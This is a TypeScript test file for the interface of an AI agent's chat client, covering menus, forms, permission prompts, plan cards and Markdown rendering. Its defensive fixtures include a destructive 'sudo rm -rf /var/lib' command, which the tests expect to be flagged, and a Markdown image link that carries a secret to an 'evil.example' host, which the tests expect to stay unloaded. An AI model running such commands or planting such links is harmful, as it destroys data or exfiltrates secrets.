// @vitest-environment jsdom
import { beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import type { ReactElement } from "react";
import type { ChatItem } from "../lib/client/model";

(globalThis as Record<string, unknown>).IS_REACT_ACT_ENVIRONMENT = true;

const respondRequest = vi.fn<(...a: unknown[]) => Promise<unknown>>(() => Promise.resolve({}));
const cancelRequest = vi.fn<(...a: unknown[]) => Promise<unknown>>(() => Promise.resolve({}));

const apiMock = vi.fn<(...a: unknown[]) => Promise<unknown>>(() => Promise.resolve({}));
const dismissNoticeMock = vi.fn<(...a: unknown[]) => Promise<unknown>>(() => Promise.resolve({}));

vi.mock("@/lib/client/api", () => ({
  respondRequest: (...a: unknown[]) => respondRequest(...a),
  cancelRequest: (...a: unknown[]) => cancelRequest(...a),
  dismissNotice: (...a: unknown[]) => dismissNoticeMock(...a),
  api: (...a: unknown[]) => apiMock(...a),
}));

import { FloatMenu } from "../components/ContextMenu";
import Markdown from "../components/Markdown";
import ElicitationCard from "../components/ElicitationCard";
import PermissionCard from "../components/PermissionCard";
import MessageItem from "../components/MessageItem";
import { ThoughtExpandCtx } from "../components/PlanMetaCtx";

const renderAct = (el: ReactElement) => {
  let r: ReturnType<typeof render>;
  act(() => {
    r = render(el);
  });
  return r!;
};

beforeEach(() => {
  cleanup();
  respondRequest.mockClear();
  cancelRequest.mockClear();
  apiMock.mockClear();
});

describe("FloatMenu", () => {
  it("stays open when scrolling inside the menu, closes on outside scroll", () => {
    const onClose = vi.fn();
    renderAct(
      <FloatMenu x={10} y={10} items={[{ label: "Alpha", onClick: () => {} }]} onClose={onClose} />,
    );
    const item = screen.getByText("Alpha");
    // the opening tap's own scroll-into-view lands right after opening
    fireEvent.scroll(document.body);
    expect(onClose).not.toHaveBeenCalled();
    const now = performance.now();
    const spy = vi.spyOn(performance, "now").mockReturnValue(now + 1000);
    fireEvent.scroll(item);
    expect(onClose).not.toHaveBeenCalled();
    fireEvent.scroll(document.body);
    expect(onClose).toHaveBeenCalledTimes(1);
    spy.mockRestore();
  });

  it("closes on Escape and runs the item on click", () => {
    const onClose = vi.fn();
    const onClick = vi.fn();
    renderAct(
      <FloatMenu x={10} y={10} items={[{ label: "Beta", onClick }]} onClose={onClose} />,
    );
    fireEvent.keyDown(window, { key: "Escape" });
    expect(onClose).toHaveBeenCalledTimes(1);
    fireEvent.click(screen.getByText("Beta"));
    expect(onClick).toHaveBeenCalledTimes(1);
  });
});

describe("FloatMenu with an anchor", () => {
  it("ignores scrolls of containers that do not hold the anchor", () => {
    const onClose = vi.fn();
    renderAct(
      <div>
        <div data-testid="chat" />
        <div data-testid="side">
          <button>row</button>
        </div>
      </div>,
    );
    const row = screen.getByText("row");
    renderAct(
      <FloatMenu x={10} y={10} anchor={row} items={[{ label: "Gamma", onClick: () => {} }]} onClose={onClose} />,
    );
    const spy = vi.spyOn(performance, "now").mockReturnValue(performance.now() + 1000);
    fireEvent.scroll(screen.getByTestId("chat"));
    expect(onClose).not.toHaveBeenCalled();
    fireEvent.scroll(screen.getByTestId("side"));
    expect(onClose).toHaveBeenCalledTimes(1);
    spy.mockRestore();
  });
});

const req = (params: Record<string, unknown>): Extract<ChatItem, { kind: "request" }> => ({
  id: "req-r1",
  kind: "request",
  requestId: "r1",
  method: "elicitation/create",
  params,
});

describe("ElicitationCard", () => {
  it("keeps Submit blocked until required fields are filled, and only warns on attempt", async () => {
    renderAct(
      <ElicitationCard
        sessionId="s1"
        item={req({
          message: "Fill it",
          requestedSchema: {
            type: "object",
            properties: { name: { type: "string", title: "Name" } },
            required: ["name"],
          },
        })}
      />,
    );
    const submit = screen.getByText("Submit") as HTMLButtonElement;
    expect(submit.getAttribute("aria-disabled")).toBe("true");
    // no error shown before the user acts
    expect(screen.queryByText(/required fields missing/)).toBeNull();
    act(() => {
      fireEvent.click(submit);
    });
    expect(respondRequest).not.toHaveBeenCalled();
    expect(screen.getByText(/required fields missing/)).toBeTruthy();
    fireEvent.change(screen.getByRole("textbox"), { target: { value: "example" } });
    expect(submit.getAttribute("aria-disabled")).toBe("false");
    await act(async () => {
      fireEvent.click(submit);
    });
    expect(respondRequest).toHaveBeenCalledWith("s1", "r1", {
      action: "accept",
      content: { name: "example" },
    });
  });

  it("coerces numeric fields and applies schema defaults", async () => {
    renderAct(
      <ElicitationCard
        sessionId="s1"
        item={req({
          message: "Numbers",
          requestedSchema: {
            type: "object",
            properties: {
              count: { type: "integer", title: "Count" },
              mode: { type: "string", title: "Mode", default: "fast" },
            },
            required: ["count"],
          },
        })}
      />,
    );
    const num = document.querySelector('input[type="number"]') as HTMLInputElement;
    expect(num).toBeTruthy();
    fireEvent.change(num, { target: { value: "42" } });
    await act(async () => {
      fireEvent.click(screen.getByText("Submit"));
    });
    expect(respondRequest).toHaveBeenCalledWith("s1", "r1", {
      action: "accept",
      content: { count: 42, mode: "fast" },
    });
  });

  it("url mode can accept after opening the link", async () => {
    renderAct(
      <ElicitationCard
        sessionId="s1"
        item={req({ mode: "url", url: "https://example.com", message: "Finish the flow" })}
      />,
    );
    await act(async () => {
      fireEvent.click(screen.getByText("Done"));
    });
    expect(respondRequest).toHaveBeenCalledWith("s1", "r1", { action: "accept" });
  });
});

const perm = (): Extract<ChatItem, { kind: "request" }> => ({
  id: "req-p1",
  kind: "request",
  requestId: "p1",
  method: "session/request_permission",
  params: {
    sessionId: "s1",
    toolCall: {
      toolCallId: "t1",
      title: "Edit file",
      rawInput: { path: "/tmp/x.ts" },
      content: [{ type: "diff", path: "/tmp/x.ts", oldText: "old line\n", newText: "new line\n" }],
    },
    options: [
      { optionId: "once", name: "Allow", kind: "allow_once" },
      { optionId: "always", name: "Always", kind: "allow_always" },
      { optionId: "no", name: "Reject", kind: "reject_once" },
    ],
  },
});

describe("PermissionCard", () => {
  it("previews the diff it asks permission for", () => {
    renderAct(<PermissionCard sessionId="s1" item={perm()} />);
    expect(screen.getByText("new line")).toBeTruthy();
    expect(screen.getByText("old line")).toBeTruthy();
  });

  it("ignores shortcut keys while a form control has focus", () => {
    renderAct(
      <>
        <select aria-label="mode">
          <option>a</option>
        </select>
        <PermissionCard sessionId="s1" item={perm()} />
      </>,
    );
    const select = screen.getByLabelText("mode");
    select.focus();
    fireEvent.keyDown(select, { key: "A", shiftKey: true });
    fireEvent.keyDown(select, { key: "y" });
    expect(respondRequest).not.toHaveBeenCalled();
  });

  it("Y allows once, plain A does nothing", () => {
    renderAct(<PermissionCard sessionId="s1" item={perm()} />);
    (document.activeElement as HTMLElement | null)?.blur();
    fireEvent.keyDown(document.body, { key: "a" });
    expect(respondRequest).not.toHaveBeenCalled();
    fireEvent.keyDown(document.body, { key: "y" });
    expect(respondRequest).toHaveBeenLastCalledWith("s1", "p1", {
      outcome: { outcome: "selected", optionId: "once" },
    });
  });

  it("Shift+A allows always", () => {
    renderAct(<PermissionCard sessionId="s1" item={perm()} />);
    (document.activeElement as HTMLElement | null)?.blur();
    fireEvent.keyDown(document.body, { key: "A", shiftKey: true });
    expect(respondRequest).toHaveBeenLastCalledWith("s1", "p1", {
      outcome: { outcome: "selected", optionId: "always" },
    });
  });

  it("disables every control once an answer is in flight", async () => {
    renderAct(<PermissionCard sessionId="s1" item={perm()} />);
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: /Allow/ }));
    });
    expect(respondRequest).toHaveBeenCalledTimes(1);
    // a second keypress/click must not send a second answer
    (document.activeElement as HTMLElement | null)?.blur();
    fireEvent.keyDown(document.body, { key: "y" });
    fireEvent.click(screen.getByRole("button", { name: /Reject/ }));
    expect(respondRequest).toHaveBeenCalledTimes(1);
    expect(screen.getByRole("button", { name: "Cancel" })).toHaveProperty("disabled", true);
  });

  it("resolved cards show the server outcome label, falling back to Resolved", () => {
    const { unmount } = renderAct(
      <PermissionCard sessionId="s1" item={{ ...perm(), resolved: true, resolvedWith: "Allow" }} />,
    );
    expect(screen.getByText("✓ Allow")).toBeTruthy();
    unmount();
    renderAct(<PermissionCard sessionId="s1" item={{ ...perm(), resolved: true }} />);
    expect(screen.getByText("Resolved")).toBeTruthy();
  });

  it("flags destructive commands and shows the cwd", () => {
    const p = perm();
    p.params = {
      ...p.params,
      toolCall: {
        toolCallId: "t1",
        title: "Run command",
        rawInput: { command: "sudo rm -rf /var/lib" },
        _meta: { "cognition.ai/cwd": "/home/x" },
      },
    };
    renderAct(<PermissionCard sessionId="s1" item={p} />);
    expect(screen.getByText("destructive")).toBeTruthy();
    expect(screen.getByText("in /home/x")).toBeTruthy();
    expect(screen.getByText(/auto-approves future calls/)).toBeTruthy();
  });
});

describe("plan tool cards", () => {
  const todoItem = (): ChatItem => ({
    id: "bf-3",
    kind: "tool",
    tool: {
      toolCallId: "tc-todo",
      title: "todo_write",
      status: "completed",
      _meta: { "cognition.ai/inferenceToolName": "todo_write" },
      rawInput: {
        todos: [
          { content: "step one", status: "completed" },
          { content: "step two", status: "pending" },
        ],
      },
    },
  });

  it("renders todo_write rows as a plan checklist card, not a wrench", () => {
    renderAct(<MessageItem item={todoItem()} sessionId="s1" />);
    expect(screen.getByText(/Plan update · 1\/2/)).toBeTruthy();
    expect(screen.queryByText('"todos"')).toBeNull(); // no raw JSON header view
    act(() => {
      fireEvent.click(screen.getByText(/Plan update/));
    });
    expect(screen.getByText("step one")).toBeTruthy();
    expect(screen.getByText("step two")).toBeTruthy();
  });

  it("still renders ordinary tools with the generic card", () => {
    const item: ChatItem = {
      id: "bf-4",
      kind: "tool",
      tool: { toolCallId: "tc-x", title: "Run ls", kind: "execute", status: "completed" },
    };
    renderAct(<MessageItem item={item} sessionId="s1" />);
    expect(screen.getByText("Run ls")).toBeTruthy();
    expect(screen.queryByText(/Plan update/)).toBeNull();
  });
});

describe("notice items", () => {
  const notice = (): Extract<ChatItem, { kind: "notice" }> => ({
    id: "ev-9",
    kind: "notice",
    text: "Error: daily usage quota exhausted",
  });

  it("renders as an alert with a dismiss button that calls the dismiss API", async () => {
    renderAct(<MessageItem item={notice()} sessionId="s1" />);
    const alert = screen.getByRole("alert");
    expect(alert.textContent).toContain("Error: daily usage quota exhausted");
    const btn = screen.getByRole("button", { name: "Dismiss" });
    await act(async () => {
      fireEvent.click(btn);
    });
    expect(dismissNoticeMock).toHaveBeenCalledWith("s1", "ev-9");
    expect(btn).toHaveProperty("disabled", true);
  });
});

describe("PermissionCard exit plan", () => {
  const exitPerm = (): Extract<ChatItem, { kind: "request" }> => ({
    id: "req-exit",
    kind: "request",
    requestId: "p-exit",
    method: "session/request_permission",
    params: {
      sessionId: "s1",
      toolCall: {
        toolCallId: "t-exit",
        title: "Exit plan mode",
        rawInput: { plan: "# Ship it\n\n- step the plan" },
        _meta: {
          "cognition.ai/isExitPlan": true,
          "cognition.ai/planFilePath": "/tmp/plan.md",
        },
      },
      options: [{ optionId: "go", name: "Proceed", kind: "allow_once" }],
    },
  });

  it("renders the plan markdown instead of the rawInput JSON", () => {
    const { container } = renderAct(<PermissionCard sessionId="s1" item={exitPerm()} />);
    expect(screen.getByText("Ship it")).toBeTruthy();
    expect(screen.getByText(/step the plan/)).toBeTruthy();
    expect(container.querySelector("pre")).toBeNull(); // no JSON dump
  });

  it("opens the plan file modal from cognition.ai/planFilePath", async () => {
    apiMock.mockResolvedValueOnce({ content: "# File plan\n\nbody of the plan file" });
    renderAct(<PermissionCard sessionId="s1" item={exitPerm()} />);
    await act(async () => {
      fireEvent.click(screen.getByText("View plan file"));
    });
    expect(apiMock).toHaveBeenCalledWith(
      `/api/fs/read?path=${encodeURIComponent("/tmp/plan.md")}`,
    );
    expect(await screen.findByText("File plan")).toBeTruthy();
    expect(screen.getByText(/body of the plan file/)).toBeTruthy();
    act(() => {
      fireEvent.keyDown(window, { key: "Escape" });
    });
    expect(screen.queryByText(/body of the plan file/)).toBeNull();
  });
});

describe("thought items", () => {
  const thought = (text = "mulling it over"): ChatItem => ({
    id: "p-th-0",
    kind: "text",
    role: "thought",
    text,
    done: true,
  });

  it("renders collapsed by default, expands on click, and shows a char count", () => {
    renderAct(<MessageItem item={thought()} sessionId="s1" />);
    expect(screen.queryByText("mulling it over")).toBeNull();
    expect(screen.getByText("15 chars")).toBeTruthy();
    act(() => {
      fireEvent.click(screen.getByText(/thought|thinking/));
    });
    expect(screen.getByText("mulling it over")).toBeTruthy();
  });

  it("previews the first line while collapsed", () => {
    renderAct(<MessageItem item={thought("**Checking the cache**\nthen more detail")} sessionId="s1" />);
    expect(screen.getByText("— Checking the cache")).toBeTruthy();
    expect(screen.queryByText(/then more detail/)).toBeNull();
  });

  it("abbreviates the char count above 999", () => {
    renderAct(<MessageItem item={thought("x".repeat(1500))} sessionId="s1" />);
    expect(screen.getByText("1.5k chars")).toBeTruthy();
  });

  it("ThoughtExpandCtx forces the body open without a click", () => {
    renderAct(
      <ThoughtExpandCtx.Provider value={true}>
        <MessageItem item={thought()} sessionId="s1" />
      </ThoughtExpandCtx.Provider>,
    );
    expect(screen.getByText("mulling it over")).toBeTruthy();
  });
});

describe("Markdown", () => {
  it("opens links in a new tab", () => {
    const { container } = render(<Markdown>{"see [docs](https://example.com/x)"}</Markdown>);
    const a = container.querySelector("a");
    expect(a?.target).toBe("_blank");
    expect(a?.rel).toContain("noreferrer");
  });

  it("never auto-loads a remote image — it becomes an explicit link", () => {
    const { container } = render(<Markdown>{"![leak](https://evil.example/p.png?d=secret)"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    const a = container.querySelector("a");
    expect(a?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
    expect(a?.textContent).toContain("evil.example");
  });

  it("still renders same-origin images inline", () => {
    const { container } = render(<Markdown>{"![icon](/icon-192.png)"}</Markdown>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/icon-192.png");
  });

  it("lazy-highlights fenced code via shiki", async () => {
    const { container } = render(
      <Markdown>{"```ts\nconst x: number = 1\n```"}</Markdown>,
    );
    // pre+header render immediately; shiki swaps in highlighted html
    expect(container.querySelector(".codeblock pre")).toBeTruthy();
    await waitFor(
      () => expect(container.querySelector(".shiki-wrap pre.shiki")).toBeTruthy(),
      { timeout: 8000 },
    );
  }, 10000);
});
